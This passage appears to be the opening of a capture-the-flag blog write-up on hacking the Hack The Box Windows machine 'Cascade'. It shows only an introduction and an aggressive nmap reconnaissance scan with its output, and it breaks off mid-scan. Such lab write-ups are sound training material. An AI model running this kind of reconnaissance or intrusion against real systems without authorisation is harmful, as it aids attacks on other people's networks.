<a class="post-tag" href="/tags.html#windows">#windows</a><a class="post-tag" href="/tags.html#activedirectory">#activedirectory</a><a class="post-tag" href="/tags.html#evilwinrm">#evilwinrm</a><a class="post-tag" href="/tags.html#smb">#smb</a><a class="post-tag" href="/tags.html#rpcclient">#rpcclient</a><a class="post-tag" href="/tags.html#ldapsearch">#ldapsearch</a><a class="post-tag" href="/tags.html#dnspy">#dnspy</a>
</div></header>
<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

    <div class="post-content e-content" itemprop="articleBody">

      <p>Cascade is a windows machine on Hackthebox, made by VBSCRUB which I personally a big fan of him. This box is one hell of an awsome machine made by him.</p>

<h2 id="info">Info</h2>

<table>
  <thead>
    <tr>
      <th>Cascade</th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: right">OS</td>
      <td>Windows</td>
    </tr>
    <tr>
      <td style="text-align: right">Difficulty</td>
      <td>Medium</td>
    </tr>
    <tr>
      <td style="text-align: right">Points</td>
      <td>30</td>
    </tr>
    <tr>
      <td style="text-align: right">Release</td>
      <td>28 Mar 2020</td>
    </tr>
    <tr>
      <td style="text-align: right">IP</td>
      <td>10.10.10.182</td>
    </tr>
  </tbody>
</table>

<h2 id="lets-start-hacking-into-cascade">Let’s start hacking into <code class="language-plaintext highlighter-rouge">CASCADE</code>
</h2>

<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="no">A</span> <span class="o">-</span><span class="no">T4</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="n">sC</span> <span class="o">-</span><span class="n">vvv</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span>                                                                                                                                                                                      
<span class="no">Starting</span> <span class="no">Nmap</span> <span class="mf">7.80</span> <span class="p">(</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">23</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span> <span class="no">EDT</span>                                                                                                                                                                            
<span class="no">NSE</span><span class="p">:</span> <span class="no">Loaded</span> <span class="mi">151</span> <span class="n">scripts</span> <span class="k">for</span> <span class="n">scanning</span><span class="o">.</span>                                                                                                                                                                                                      
<span class="no">NSE</span><span class="p">:</span> <span class="no">Script</span> <span class="no">Pre</span><span class="o">-</span><span class="n">scanning</span><span class="o">.</span>                                                                                                                                                                                                                  
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">1</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>                                                                                                                                                                                                      
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span>                                                                                                                                                                                                                    
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span><span class="p">,</span> <span class="mf">0.00</span><span class="n">s</span> <span class="n">elapsed</span>                                                                                                                                                                                                      
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">2</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>                                                                                                                                                                                                      
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span>                                                                                                                                                                                                                    
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span><span class="p">,</span> <span class="mf">0.00</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">3</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span>
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span><span class="p">,</span> <span class="mf">0.00</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">Initiating</span> <span class="no">SYN</span> <span class="no">Stealth</span> <span class="no">Scan</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span>
<span class="no">Scanning</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span><span class="p">)</span> <span class="p">[</span><span class="mi">1000</span> <span class="n">ports</span><span class="p">]</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">445</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">53</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">135</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">139</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">49157</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">49154</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">88</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">49165</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">636</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">49155</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">389</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">49158</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span>
<span class="no">Completed</span> <span class="no">SYN</span> <span class="no">Stealth</span> <span class="no">Scan</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span><span class="p">,</span> <span class="mf">9.90</span><span class="n">s</span> <span class="n">elapsed</span> <span class="p">(</span><span class="mi">1000</span> <span class="n">total</span> <span class="n">ports</span><span class="p">)</span>
<span class="no">Initiating</span> <span class="no">Service</span> <span class="nb">scan</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span>
<span class="no">Scanning</span> <span class="mi">14</span> <span class="n">services</span> <span class="n">on</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span><span class="p">)</span>
<span class="no">Completed</span> <span class="no">Service</span> <span class="nb">scan</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">53</span><span class="p">,</span> <span class="mf">56.75</span><span class="n">s</span> <span class="n">elapsed</span> <span class="p">(</span><span class="mi">14</span> <span class="n">services</span> <span class="n">on</span> <span class="mi">1</span> <span class="n">host</span><span class="p">)</span>
<span class="no">Initiating</span> <span class="no">OS</span> <span class="n">detection</span> <span class="p">(</span><span class="n">try</span> <span class="c1">#1) against cascade.htb (10.10.10.182)</span>
<span class="no">Retrying</span> <span class="no">OS</span> <span class="n">detection</span> <span class="p">(</span><span class="n">try</span> <span class="c1">#2) against cascade.htb (10.10.10.182)</span>
<span class="no">Initiating</span> <span class="no">Traceroute</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">53</span>
<span class="no">Completed</span> <span class="no">Traceroute</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">53</span><span class="p">,</span> <span class="mf">0.22</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">Initiating</span> <span class="no">Parallel</span> <span class="no">DNS</span> <span class="n">resolution</span> <span class="n">of</span> <span class="mi">2</span> <span class="n">hosts</span><span class="p">.</span> <span class="nf">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">53</span>
<span class="no">Completed</span> <span class="no">Parallel</span> <span class="no">DNS</span> <span class="n">resolution</span> <span class="n">of</span> <span class="mi">2</span> <span class="n">hosts</span><span class="p">.</span> <span class="nf">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">53</span><span class="p">,</span> <span class="mf">13.11</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">DNS</span> <span class="n">resolution</span> <span class="n">of</span> <span class="mi">1</span> <span class="no">IPs</span> <span class="n">took</span> <span class="mf">13.11</span><span class="n">s</span><span class="o">.</span> <span class="no">Mode</span><span class="p">:</span> <span class="no">Async</span> <span class="p">[</span><span class="c1">#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]</span>
<span class="no">NSE</span><span class="p">:</span> <span class="no">Script</span> <span class="n">scanning</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span><span class="o">.</span>
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">1</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">53</span>
<span class="no">NSE</span> <span class="no">Timing</span><span class="p">:</span> <span class="no">About</span> <span class="mf">99.95</span><span class="o">%</span> <span class="n">done</span><span class="p">;</span> <span class="no">ETC</span><span class="p">:</span> <span class="mo">02</span><span class="p">:</span><span class="mi">54</span> <span class="p">(</span><span class="mi">0</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span> <span class="n">remaining</span><span class="p">)</span>
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">54</span><span class="p">,</span> <span class="mf">40.20</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">2</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">54</span>
<span class="no">NSE</span> <span class="no">Timing</span><span class="p">:</span> <span class="no">About</span> <span class="mf">97.32</span><span class="o">%</span> <span class="n">done</span><span class="p">;</span> <span class="no">ETC</span><span class="p">:</span> <span class="mo">02</span><span class="p">:</span><span class="mi">54</span> <span class="p">(</span><span class="mi">0</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">01</span> <span class="n">remaining</span><span class="p">)</span>
<span class="no">NSE</span> <span class="no">Timing</span><span class="p">:</span> <span class="no">About</span> <span class="mf">98.21</span><span class="o">%</span> <span class="n">done</span><span class="p">;</span> <span class="no">ETC</span><span class="p">:</span> <span class="mo">02</span><span class="p">:</span><span class="mi">55</span> <span class="p">(</span><span class="mi">0</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">01</span> <span class="n">remaining</span><span class="p">)</span>
<span class="no">NSE</span> <span class="no">Timing</span><span class="p">:</span> <span class="no">About</span> <span class="mf">99.11</span><span class="o">%</span> <span class="n">done</span><span class="p">;</span> <span class="no">ETC</span><span class="p">:</span> <span class="mo">02</span><span class="p">:</span><span class="mi">55</span> <span class="p">(</span><span class="mi">0</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">01</span> <span class="n">remaining</span><span class="p">)</span>
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span><span class="p">,</span> <span class="mf">120.90</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">3</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span>
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span><span class="p">,</span> <span class="mf">0.00</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span><span class="p">)</span>
<span class="no">Host</span> <span class="n">is</span> <span class="n">up</span><span class="p">,</span> <span class="n">received</span> <span class="n">user</span><span class="o">-</span><span class="n">set</span> <span class="p">(</span><span class="mf">0.18</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="no">Scanned</span> <span class="n">at</span> <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">23</span> <span class="mo">02</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">18</span> <span class="no">EDT</span> <span class="k">for</span> <span class="mi">246</span><span class="n">s</span>
<span class="no">Not</span> <span class="ss">shown: </span><span class="mi">986</span> <span class="n">filtered</span> <span class="n">ports</span>
<span class="no">Reason</span><span class="p">:</span> <span class="mi">986</span> <span class="n">no</span><span class="o">-</span><span class="n">responses</span>
<span class="no">PORT</span>      <span class="no">STATE</span> <span class="no">SERVICE</span>       <span class="no">REASON</span>          <span class="no">VERSION</span>
<span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">domain</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">DNS</span> <span class="mf">6.1</span><span class="o">.</span><span class="mi">7601</span> <span class="p">(</span><span class="mi">1</span><span class="no">DB15D39</span><span class="p">)</span> <span class="p">(</span><span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2008</span> <span class="no">R2</span> <span class="no">SP1</span><span class="p">)</span>
<span class="o">|</span> <span class="n">dns</span><span class="o">-</span><span class="ss">nsid: 
</span><span class="o">|</span><span class="n">_</span>  <span class="n">bind</span><span class="p">.</span><span class="nf">version</span><span class="p">:</span> <span class="no">Microsoft</span> <span class="no">DNS</span> <span class="mf">6.1</span><span class="o">.</span><span class="mi">7601</span> <span class="p">(</span><span class="mi">1</span><span class="no">DB15D39</span><span class="p">)</span>
<span class="mi">88</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">tcpwrapped</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span>
<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>   <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
<span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ldap</span>          <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Active</span> <span class="no">Directory</span> <span class="no">LDAP</span> <span class="p">(</span><span class="no">Domain</span><span class="p">:</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="p">,</span> <span class="no">Site</span><span class="p">:</span> <span class="no">Default</span><span class="o">-</span><span class="no">First</span><span class="o">-</span><span class="no">Site</span><span class="o">-</span><span class="no">Name</span><span class="p">)</span>
<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds?</span> <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span>
<span class="mi">636</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">tcpwrapped</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span>
<span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ldap</span>          <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Active</span> <span class="no">Directory</span> <span class="no">LDAP</span> <span class="p">(</span><span class="no">Domain</span><span class="p">:</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="p">,</span> <span class="no">Site</span><span class="p">:</span> <span class="no">Default</span><span class="o">-</span><span class="no">First</span><span class="o">-</span><span class="no">Site</span><span class="o">-</span><span class="no">Name</span><span class="p">)</span>
<span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">tcpwrapped</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span>
<span class="mi">49154</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
<span class="mi">49155</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
<span class="mi">49157</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ncacn_http</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span> <span class="n">over</span> <span class="no">HTTP</span> <span class="mf">1.0</span>
<span class="mi">49158</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
<span class="mi">49165</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">RPC</span>
<span class="no">Warning</span><span class="p">:</span> <span class="no">OSScan</span> <span class="n">results</span> <span class="n">may</span> <span class="n">be</span> <span class="n">unreliable</span> <span class="n">because</span> <span class="n">we</span> <span class="n">could</span> <span class="n">not</span> <span class="n">find</span> <span class="n">at</span> <span class="n">least</span> <span class="mi">1</span> <span class="nb">open</span> <span class="n">and</span> <span class="mi">1</span> <span class="n">closed</span> <span class="n">port</span>
<span class="no">Device</span> <span class="ss">type: </span><span class="n">general</span> <span class="n">purpose</span><span class="o">|</span><span class="n">phone</span><span class="o">|</span><span class="n">specialized</span>
<span class="no">Running</span> <span class="p">(</span><span class="no">JUST</span> <span class="no">GUESSING</span><span class="p">):</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mi">8</span><span class="o">|</span><span class="no">Phone</span><span class="o">|</span><span class="mi">2008</span><span class="o">|</span><span class="mi">7</span><span class="o">|</span><span class="mf">8.1</span><span class="o">|</span><span class="no">Vista</span><span class="o">|</span><span class="mi">2012</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">)</span>
<span class="no">OS</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">\:microsoft\:windows_8</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">\:microsoft\:windows</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">\:microsoft\:windows_server_2008:r2</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">\:microsoft\:windows_7</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">\:microsoft\:windows_8</span><span class="o">.</span><span class="mi">1</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">\:microsoft\:windows_vista</span><span class="o">::-</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">\:microsoft\:windows_vista</span><span class="o">::</span><span class="n">sp1</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">\:microsoft\:windows_server_2012</span>
<span class="no">OS</span> <span class="n">fingerprint</span> <span class="n">not</span> <span class="n">ideal</span> <span class="ss">because: </span><span class="no">Missing</span> <span class="n">a</span> <span class="n">closed</span> <span class="no">TCP</span> <span class="n">port</span> <span class="n">so</span> <span class="n">results</span> <span class="n">incomplete</span>
<span class="no">Aggressive</span> <span class="no">OS</span> <span class="ss">guesses: </span><span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mf">8.1</span> <span class="no">Update</span> <span class="mi">1</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Phone</span> <span class="mf">7.5</span> <span class="n">or</span> <span class="mf">8.0</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mi">7</span> <span class="n">or</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2008</span> <span class="no">R2</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2008</span> <span class="no">R2</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2008</span> <span class="no">R2</span> <span class="n">or</span> <span class="no">Windows</span> <span class="mf">8.1</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2008</span> <span class="no">R2</span> <span class="no">SP1</span> <span class="n">or</span> <span class="no">Windows</span> <span class="mi">8</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mi">7</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mi">7</span> <span class="no">Professional</span> <span class="n">or</span> <span class="no">Windows</span> <span class="mi">8</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mi">7</span> <span class="no">SP1</span> <span class="n">or</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2008</span> <span class="no">R2</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mi">7</span> <span class="no">SP1</span> <span class="n">or</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2008</span> <span class="no">SP2</span> <span class="n">or</span> <span class="mi">2008</span> <span class="no">R2</span> <span class="no">SP1</span> <span class="p">(</span><span class="mi">91</span><span class="o">%</span><span class="p">)</span>
<span class="no">No</span> <span class="n">exact</span> <span class="no">OS</span> <span class="n">matches</span> <span class="k">for</span> <span class="n">host</span> <span class="p">(</span><span class="nb">test</span> <span class="n">conditions</span> <span class="n">non</span><span class="o">-</span><span class="n">ideal</span><span class="p">)</span><span class="o">.</span>
<span class="no">TCP</span><span class="o">/</span><span class="no">IP</span> <span class="ss">fingerprint:
</span><span class="no">SCAN</span><span class="p">(</span><span class="no">V</span><span class="o">=</span><span class="mf">7.80</span><span class="o">%</span><span class="no">E</span><span class="o">=</span><span class="mi">4</span><span class="o">%</span><span class="no">D</span><span class="o">=</span><span class="mi">7</span><span class="o">/</span><span class="mi">23</span><span class="o">%</span><span class="no">OT</span><span class="o">=</span><span class="mi">53</span><span class="o">%</span><span class="no">CT</span><span class="o">=%</span><span class="no">CU</span><span class="o">=%</span><span class="no">PV</span><span class="o">=</span><span class="no">Y</span><span class="o">%</span><span class="no">DS</span><span class="o">=</span><span class="mi">2</span><span class="o">%</span><span class="no">DC</span><span class="o">=</span><span class="no">T</span><span class="o">%</span><span class="no">G</span><span class="o">=</span><span class="no">N</span><span class="o">%</span><span class="no">TM</span><span class="o">=</span><span class="mi">5</span><span class="no">F193499</span><span class="o">%</span><span class="no">P</span><span class="o">=</span><span class="n">x86_64</span><span class="o">-</span><span class="n">pc</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="p">)</span>
<span class="no">SEQ</span><span class="p">(</span><span class="no">SP</span><span class="o">=</span><span class="mi">106</span><span class="o">%</span><span class="no">GCD</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="no">ISR</span><span class="o">=</span><span class="mi">10</span><span class="no">C</span><span class="o">%</span><span class="no">TI</span><span class="o">=</span><span class="no">I</span><span class="o">%</span><span class="no">II</span><span class="o">=</span><span class="no">I</span><span class="o">%</span><span class="no">TS</span><span class="o">=</span><span class="mi">7</span><span class="p">)</span>
<span class="no">OPS</span><span class="p">(</span><span class="no">O1</span><span class="o">=</span><span class="no">M54DNW8ST11</span><span class="o">%</span><span class="no">O2</span><span class="o">=</span><span class="no">M54DNW8ST11</span><span class="o">%</span><span class="no">O3</span><span class="o">=</span><span class="no">M54DNW8NNT11</span><span class="o">%</span><span class="no">O4</span><span class="o">=</span><span class="no">M54DNW8ST11</span><span class="o">%</span><span class="no">O5</span><span class="o">=</span><span class="no">M54DNW8ST11</span><span class="o">%</span><span class="no">O6</span><span class="o">=</span><span class="no">M54DST11</span><span class="p">)</span>
<span class="no">WIN</span><span class="p">(</span><span class="no">W1</span><span class="o">=</span><span class="mi">2000</span><span class="o">%</span><span class="no">W2</span><span class="o">=</span><span class="mi">2000</span><span class="o">%</span><span class="no">W3</span><span class="o">=</span><span class="mi">2000</span><span class="o">%</span><span class="no">W4</span><span class="o">=</span><span class="mi">2000</span><span class="o">%</span><span class="no">W5</span><span class="o">=</span><span class="mi">2000</span><span class="o">%</span><span class="no">W6</span><span class="o">=</span><span class="mi">2000</span><span class="p">)</span>
